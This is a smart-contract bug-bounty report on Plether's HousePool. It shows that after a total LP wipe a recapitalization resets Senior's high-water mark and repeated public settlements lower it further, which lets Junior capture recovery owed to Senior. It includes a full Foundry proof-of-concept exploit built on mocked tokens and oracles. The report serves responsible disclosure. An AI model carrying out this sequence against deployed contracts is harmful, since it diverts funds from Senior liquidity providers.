# \#99085 [SC-High] Recapitalization after an LP wipe resets Senior's high-water mark, and repeated settlements consume the residual against already credited assets

**Submitted on Nov 11th 2026 at 19:50:47 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99085
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
After a severe trading loss wipes the current principal of both LP tranches, Senior shares and their stored high-water mark can survive. The owner may then use the documented `CfdEngine.recapitalizePool` action to cure the pool. When the recapitalization is less than the stored Senior restoration entitlement, the first fresh reconcile credits Senior principal but overwrites its old high-water mark with the recapitalization target. If some recapitalization remains pending, later permissionless LP epoch settlements reserve that residual against value already credited to Senior. Each such settlement can lower the mark again without a new recapitalization or recovery inflow. When the pool later earns or recovers value, the waterfall credits Junior earlier than the documented Senior priority allows.

The owner need only perform a legitimate recovery action; no malicious owner action is required. A Junior holder can provide matured redemption requests that are refunded while Junior NAV is zero, giving public epoch settlements the queue progress they require. The Router path is available with valid oracle updates when positions remain open.

## Vulnerability Details
After both LP tranches are wiped, a legitimate owner recapitalization can replace Senior’s surviving high-water mark with the smaller recapitalization amount. Later LP settlements can reduce that mark again without new cash, allowing subsequent recovery to reach Junior before Senior is restored.

Losses normally leave `seniorHighWaterMark` intact because it records Senior’s priority over later revenue. But when Senior and Junior principal are both zero and Senior shares still exist, `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent()` treats the recapitalization as a fresh bootstrap and overwrites the stored mark. The one-atom Senior-principal control preserves it, showing that the zero-principal branch causes the reset.

A partial recapitalization leaves a pending balance. On later reconciles, `HousePool._settleablePendingClaimantBuckets()` can reserve that balance against assets already credited to Senior, and `HousePoolReconcilePlanLib.planReconcile()` removes it before repricing the waterfall. Senior principal is briefly wiped and bootstrapped again with a lower mark. In the PoC, public settlements move the mark from **60,000 to 40,000 to 20,000 USDG** while pool cash remains unchanged. A matured Junior redemption is refunded while Junior NAV is zero but still supplies the queue progress needed for each settlement.

Cecuro MED-12 concerned same-batch Revenue being sent to unassigned assets because the revenue-continuation decision was made before recapitalization. Here, a stored Senior mark is discarded and residual recapitalization is matched against already assigned backing in later settlements. These are distinct state transitions.


## Impact Details
Senior LPs can lose their documented priority over future pool recovery while Junior LPs receive value that should first restore Senior to its retained high-water mark. In the mock USDG loss model, a 40,000 USDG later recovery moves entirely to Junior after the overwrite, whereas the one-atom control sends it to Senior. In the Engine liability model, two additional Router settlements reduce Senior's final attribution by **6,088 USDG** versus the one-settlement control, and a Junior redemption becomes funded. The latter test does not measure an unconditional six-figure loss or prove the frequency of the required market event.




## Proof of Concept

## Proof of Concept

Save it as `packages/perps/test/poc/PoC_RecapHwmReset.t.sol` in a competition checkout at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

Three tests use mock USDG burns and later mints to model loss and recovery. The fourth reaches the wipe through actual Engine position liabilities, with no pool-token burn. It mocks out-of-scope Pyth updates and USDG, and uses production `router.commitOrder(OrderRequest)`, `router.executeOrder` and `router.settleLpEpoch` paths. The large FX basket move is a test precondition, not a price manipulation capability.

From the repository root:

```bash
forge test --root packages/perps --match-path 'test/poc/PoC_RecapHwmReset.t.sol' -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Full LP loss is modeled by burning the mock USDG, as in EngineRecapitalization.t.sol.
///         All tranche transitions are then made through public epoch settlement. No pool storage is written.
contract RecapHwmResetTest is BasePerpTest {

    address internal constant BOB = address(0xB0B);
    address internal constant CAROL = address(0xCA401);
    address internal constant DAVE = address(0xDA7E);

    uint256 internal constant RECAP = 50_000e6;
    uint256 internal constant REVENUE = 40_000e6;

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _fundJunior(BOB, 1000e6);
        _fundJunior(CAROL, 1000e6);
        _fundJunior(DAVE, 1000e6);
    }

    function _settleWithJuniorHead(
        address holder
    ) internal returns (IHousePool.LpEpochSettlementResult memory result) {
        uint256 next = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 60;
        vm.warp(next);
        uint256 shares = juniorVault.balanceOf(holder);
        assertGt(shares, 0, "holder must own junior shares");
        vm.prank(holder);
        uint256 requestId = juniorVault.requestRedeem(shares, holder, holder);
        vm.warp(pool.lpEpochStart(requestId));
        result = pool.settleLpEpoch(0, 0);
        assertGt(result.juniorProcessedEpochs, 0, "public settlement must make queue progress");
    }

    function _recapitalize() internal {
        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
    }

    function _recordRevenue() internal {
        settlementToken.mint(address(pool), REVENUE);
        vm.prank(address(engine));
        pool.recordClaimantInflow(
            REVENUE, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }

    function test_TotalWipe_RecapOverwritesSeniorMark_ThenJuniorWithdrawsRecovery() public {
        settlementToken.burn(address(pool), settlementToken.balanceOf(address(pool)));
        _settleWithJuniorHead(BOB);
        uint256 oldMark = pool.seniorHighWaterMark();
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertGt(oldMark, RECAP + REVENUE);

        _recapitalize();
        _settleWithJuniorHead(CAROL);
        assertEq(pool.seniorPrincipal(), RECAP);
        assertEq(pool.seniorHighWaterMark(), RECAP, "old senior restoration target was discarded");
        assertLt(pool.seniorHighWaterMark(), oldMark);

        _recordRevenue();
        IHousePool.LpEpochSettlementResult memory r = _settleWithJuniorHead(DAVE);
        assertEq(pool.seniorPrincipal(), RECAP, "revenue skipped senior restoration");
        assertEq(pool.juniorPrincipal() + r.juniorFundedAssets, REVENUE, "recovery was credited to junior");
        assertGt(r.juniorFundedAssets, 0, "junior can redeem the misrouted recovery");
        emit log_named_decimal_uint("senior mark before wipe", oldMark, 6);
        emit log_named_decimal_uint("senior mark after recap", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint("junior redemption funded from recovery", r.juniorFundedAssets, 6);
    }

    function test_OneAtomOfSeniorPrincipal_PreservesOldMark_Control() public {
        uint256 raw = settlementToken.balanceOf(address(pool));
        settlementToken.burn(address(pool), raw - 1);
        _settleWithJuniorHead(BOB);
        uint256 oldMark = pool.seniorHighWaterMark();
        assertEq(pool.seniorPrincipal(), 1);
        assertEq(pool.juniorPrincipal(), 0);

        _recapitalize();
        _settleWithJuniorHead(CAROL);
        assertEq(pool.seniorPrincipal(), RECAP + 1);
        assertEq(pool.seniorHighWaterMark(), oldMark, "one-atom control retains the mark");

        _recordRevenue();
        IHousePool.LpEpochSettlementResult memory r = _settleWithJuniorHead(DAVE);
        assertEq(pool.seniorPrincipal(), RECAP + REVENUE + 1, "revenue restores senior first");
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(r.juniorFundedAssets, 0);
    }

}

/// @notice Repeated public reconciles consume a residual recap bucket against unchanged pool cash.
///         Mock USDG burns model the loss; no HousePool storage or contract code is modified.
contract RecapResidualResettleTest is BasePerpTest {

    address internal constant BOB = address(0xB0B);
    address internal constant CAROL = address(0xCA401);
    address internal constant DAVE = address(0xDA7E);
    address internal constant EVE = address(0xE0E);
    address internal constant FRANK = address(0xF2A9);

    uint256 internal constant RECAP = 60_000e6;
    uint256 internal constant LOSS_AFTER_RECAP = 40_000e6;
    uint256 internal constant RECOVERY = 40_000e6;

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        _fundJunior(BOB, 1000e6);
        _fundJunior(CAROL, 1000e6);
        _fundJunior(DAVE, 1000e6);
        _fundJunior(EVE, 1000e6);
        _fundJunior(FRANK, 1000e6);
    }

    function _settleWithJuniorHead(
        address holder
    ) internal returns (IHousePool.LpEpochSettlementResult memory result) {
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 60);
        uint256 shares = juniorVault.balanceOf(holder);
        assertGt(shares, 0);
        vm.prank(holder);
        uint256 requestId = juniorVault.requestRedeem(shares, holder, holder);
        vm.warp(pool.lpEpochStart(requestId));
        result = pool.settleLpEpoch(0, 0);
        assertGt(result.juniorProcessedEpochs, 0);
    }

    function _addRevenue() internal {
        settlementToken.mint(address(pool), RECOVERY);
        vm.prank(address(engine));
        pool.recordClaimantInflow(
            RECOVERY, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }

    function test_ResidualReSettlesWithoutCashAndReroutesRecoveryToJunior() public {
        settlementToken.burn(address(pool), settlementToken.balanceOf(address(pool)));
        _settleWithJuniorHead(BOB);
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertGt(pool.seniorHighWaterMark(), RECAP);

        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
        settlementToken.burn(address(pool), LOSS_AFTER_RECAP);
        _settleWithJuniorHead(CAROL);
        assertEq(pool.seniorPrincipal(), 20_000e6);
        assertEq(pool.seniorHighWaterMark(), 60_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 40_000e6);
        uint256 cashAfterFirstSettle = settlementToken.balanceOf(address(pool));
        uint256 stateAfterFirst = vm.snapshotState();

        // Control: the pending 40k is matched only when 40k of new recovery arrives.
        _addRevenue();
        IHousePool.LpEpochSettlementResult memory control = _settleWithJuniorHead(FRANK);
        assertEq(pool.seniorPrincipal(), 60_000e6, "control restores senior");
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(control.juniorFundedAssets, 0);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertTrue(vm.revertToState(stateAfterFirst));
        vm.deleteStateSnapshot(stateAfterFirst);

        // Attack: cash and mark stay unchanged. Only two extra matured Junior refund heads cause progress.
        _settleWithJuniorHead(DAVE);
        assertEq(settlementToken.balanceOf(address(pool)), cashAfterFirstSettle, "no new cash on second settle");
        assertEq(pool.seniorPrincipal(), 20_000e6);
        assertEq(pool.seniorHighWaterMark(), 40_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 20_000e6);

        _settleWithJuniorHead(EVE);
        assertEq(settlementToken.balanceOf(address(pool)), cashAfterFirstSettle, "no new cash on third settle");
        assertEq(pool.seniorPrincipal(), 20_000e6);
        assertEq(pool.seniorHighWaterMark(), 20_000e6);
        assertEq(pool.pendingRecapitalizationAssets(), 0);

        _addRevenue();
        IHousePool.LpEpochSettlementResult memory attack = _settleWithJuniorHead(FRANK);
        assertEq(pool.seniorPrincipal(), 20_000e6, "senior misses the recovery");
        assertEq(pool.juniorPrincipal() + attack.juniorFundedAssets, RECOVERY, "junior captures recovery");
        assertGt(attack.juniorFundedAssets, 0, "junior can redeem some of the shifted value");
        emit log_named_decimal_uint("senior mark after repeated settlement", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint("junior redemption funded from recovery", attack.juniorFundedAssets, 6);
    }

}

/// @notice The same transition reached by actual Engine position liabilities, with no pool-token burn.
///         Trades and LP settlements enter through the public Router, and only mock Pyth supplies test prices.
contract RecapResidualEngineTest is BasePerpTest {

    address internal constant LONG = address(0xA7701);
    address internal constant SHORT = address(0xA7702);
    address internal constant KEEPER = address(0x6EE9E7);
    address internal constant BOB = address(0xB0B);
    address internal constant CAROL = address(0xCA401);
    address internal constant DAVE = address(0xDA7E);
    address internal constant EVE = address(0xE0E);
    address internal constant FRANK = address(0xF2A9);

    uint256 internal constant OPEN_PRICE = 1e8;
    uint256 internal constant CLOSE_PRICE = 95_000_000;
    uint256 internal constant DEFICIT_PRICE = 199_000_000;
    uint256 internal constant CHUNK = 50_000e18;
    uint256 internal constant QUANTUM = 100e18;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _fundJunior(BOB, 1000e6);
        _fundJunior(CAROL, 1000e6);
        _fundJunior(DAVE, 1000e6);
        _fundJunior(EVE, 1000e6);
        _fundJunior(FRANK, 1000e6);
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        _fundTrader(LONG, 30_000e6);
        _fundTrader(SHORT, 30_000e6);
        _refreshMark(OPEN_PRICE);
    }

    function _ticks(
        uint256 price
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_ticks(price));
    }

    function _margin(
        uint256 size
    ) internal pure returns (uint256) {
        return size / 1e12 * 250 / 10_000;
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _execute(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == close ? type(uint256).max : 1,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _mockPythUpdateData(price);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(KEEPER);
        result = router.executeOrder(id, data);
    }

    function _largestOpen(
        address trader,
        CfdTypes.Side side
    ) internal view returns (uint256) {
        uint256 lo;
        uint256 hi = CHUNK / QUANTUM;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            uint256 size = mid * QUANTUM;
            bool ok;
            try engineLens.previewOpenRevertCode(trader, side, size, _margin(size), OPEN_PRICE) returns (uint8 code) {
                ok = code == 0;
            } catch {
                ok = false;
            }
            if (ok) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        return lo * QUANTUM;
    }

    function _openHedge() internal {
        for (uint256 i; i < 30; ++i) {
            address trader = i % 2 == 0 ? LONG : SHORT;
            CfdTypes.Side side = i % 2 == 0 ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT;
            uint256 size = _largestOpen(trader, side);
            if (size < 1000e18) {
                break;
            }
            OrderV3Types.ExecutionResult memory r = _execute(trader, side, size, _margin(size), false, OPEN_PRICE);
            assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "hedge open must execute");
        }
        assertGt(_size(LONG), 100_000e18);
        assertGt(_size(SHORT), 100_000e18);
    }

    function _settleWithJuniorHead(
        address holder,
        uint256 price
    ) internal returns (uint256 requestId) {
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 60);
        uint256 shares = juniorVault.balanceOf(holder);
        assertGt(shares, 0);
        vm.prank(holder);
        requestId = juniorVault.requestRedeem(shares, holder, holder);
        vm.warp(pool.lpEpochStart(requestId));
        vm.roll(vm.getBlockNumber() + 1);
        router.settleLpEpoch(_ticks(price));
    }

    function test_EngineLoss_RecapResidualLowersSeniorMark() public {
        uint256 oldMark = pool.seniorHighWaterMark();
        _openHedge();
        uint256 longSize = _size(LONG);
        OrderV3Types.ExecutionResult memory close = _execute(LONG, CfdTypes.Side.LONG, longSize, 0, true, CLOSE_PRICE);
        assertEq(uint8(close.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertTrue(engine.degradedMode(), "winning close must latch degraded mode");
        _refreshMark(DEFICIT_PRICE);

        uint256 liability = _maxLiability();
        uint256 cash = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        uint256 equity = cash > claims ? cash - claims : 0;
        assertGt(liability, equity, "owner cure must be needed");
        uint256 recap = liability - equity + 1000e6;
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        engine.clearDegradedMode();

        _settleWithJuniorHead(BOB, DEFICIT_PRICE);
        emit log_named_decimal_uint("recap", recap, 6);
        emit log_named_decimal_uint("senior after first engine-path settle", pool.seniorPrincipal(), 6);
        emit log_named_decimal_uint("senior mark after first engine-path settle", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint(
            "residual recap after first engine-path settle", pool.pendingRecapitalizationAssets(), 6
        );
        assertGt(pool.pendingRecapitalizationAssets(), 0, "recap must have a residual");
        assertEq(pool.juniorPrincipal(), 0);
        assertLt(pool.seniorHighWaterMark(), oldMark, "engine-driven wipe discards the stored senior mark");

        uint256 firstState = vm.snapshotState();
        uint256 markAfterFirst = pool.seniorHighWaterMark();
        _settleWithJuniorHead(CAROL, DEFICIT_PRICE);
        emit log_named_decimal_uint("senior mark after second engine-path settle", pool.seniorHighWaterMark(), 6);
        assertLt(pool.seniorHighWaterMark(), markAfterFirst, "same mark re-settles residual recap");
        uint256 markAfterSecond = pool.seniorHighWaterMark();
        _settleWithJuniorHead(DAVE, DEFICIT_PRICE);
        assertLt(pool.seniorHighWaterMark(), markAfterSecond, "a third settle lowers the mark again");
        uint256 attackMark = pool.seniorHighWaterMark();
        uint256 closeTime = vm.getBlockTimestamp();

        // Both branches close the surviving position at the same mark and final time, making pool cash withdrawable.
        uint256 shortSize = _size(SHORT);
        OrderV3Types.ExecutionResult memory exit = _execute(SHORT, CfdTypes.Side.SHORT, shortSize, 0, true, OPEN_PRICE);
        assertEq(uint8(exit.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        uint256 attackRequest = _settleWithJuniorHead(FRANK, OPEN_PRICE);
        uint256 attackSenior = pool.seniorPrincipal();
        uint256 attackJunior = pool.juniorPrincipal() + juniorVault.claimableRedeemAssets(attackRequest, FRANK);
        uint256 attackUnassigned = pool.unassignedAssets();
        assertGt(juniorVault.claimableRedeemAssets(attackRequest, FRANK), 0, "junior recovery is withdrawable");

        assertTrue(vm.revertToState(firstState));
        vm.deleteStateSnapshot(firstState);
        vm.warp(closeTime);
        shortSize = _size(SHORT);
        exit = _execute(SHORT, CfdTypes.Side.SHORT, shortSize, 0, true, OPEN_PRICE);
        assertEq(uint8(exit.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        uint256 controlRequest = _settleWithJuniorHead(FRANK, OPEN_PRICE);
        uint256 controlSenior = pool.seniorPrincipal();
        uint256 controlJunior = pool.juniorPrincipal() + juniorVault.claimableRedeemAssets(controlRequest, FRANK);
        uint256 controlUnassigned = pool.unassignedAssets();

        emit log_named_decimal_uint("senior final: repeated settlements", attackSenior, 6);
        emit log_named_decimal_uint("senior final: one settlement", controlSenior, 6);
        emit log_named_decimal_uint("junior final: repeated settlements", attackJunior, 6);
        emit log_named_decimal_uint("junior final: one settlement", controlJunior, 6);
        emit log_named_decimal_uint("unassigned final: repeated settlements", attackUnassigned, 6);
        emit log_named_decimal_uint("unassigned final: one settlement", controlUnassigned, 6);
        assertEq(
            attackSenior + attackJunior + attackUnassigned,
            controlSenior + controlJunior + controlUnassigned,
            "the same total value is assigned to different claimants"
        );
        assertLt(attackMark, markAfterFirst);
        assertLt(attackSenior, controlSenior, "extra reconciles reduce senior recovery");
        assertGt(attackJunior, controlJunior, "extra reconciles route more recovery to junior");
    }

}
```
